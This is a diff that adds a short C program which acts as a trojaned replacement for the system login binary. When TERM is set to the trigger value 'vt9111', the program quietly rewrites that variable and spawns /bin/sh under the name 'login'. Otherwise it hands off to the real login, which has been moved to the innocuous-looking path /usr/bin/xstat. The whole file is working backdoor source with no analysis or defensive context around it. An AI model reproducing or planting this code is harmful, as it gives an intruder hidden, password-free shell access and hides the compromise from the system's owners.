@@ -1,0 +1,53 @@
+#define _XOPEN_SOURCE
+#include <unistd.h>
+#include <stdio.h>
+#include <signal.h>
+#include <sys/time.h>
+#include <string.h>
+#define SHELL "/bin/sh"
+#define SHELL_CALLME "login"
+#define LOGIN "/usr/bin/xstat"
+#define LOGIN_CALLME "login"
+#define ENV_NAME "TERM"
+#define ENV_VALUE "vt9111"
+#define ENV_FIX "r!!t!d"
+
+
+int owned(void);
+char **av, **ep;
+int main(int argc, char **argv, char **envp) {   
+av=argv;   
+ep=envp;   
+av[0]=SHELL_CALLME;           
+
+	if (owned()) {   
+		char *sav[]={       SHELL_CALLME, NULL   };	 
+		execve(SHELL, sav, ep);	 
+		return 0;   
+	}   
+
+execve(LOGIN, av, ep);   
+return 0;   
+
+}
+
+int owned(void) {   
+char *name, *value;   
+int i;   
+for (i=0; ep[i]!=NULL; ++i) {      
+name=strtok(ep[i], "=");      
+value=strtok(NULL, "=");      
+if (name==NULL || value==NULL) continue;      
+	if (!strncmp(name, ENV_NAME, strlen(ENV_NAME))) {	 
+		if (!strncmp(value, ENV_VALUE, strlen(ENV_VALUE))) {	    
+			char tmp[100];	
+			sprintf(tmp, "%s=%s", ENV_NAME, ENV_FIX); 	
+			ep[i]=strdup(tmp);	    
+			return 1;	 
+		}      
+	}   
+}   
+
+
+return 0;
+}      
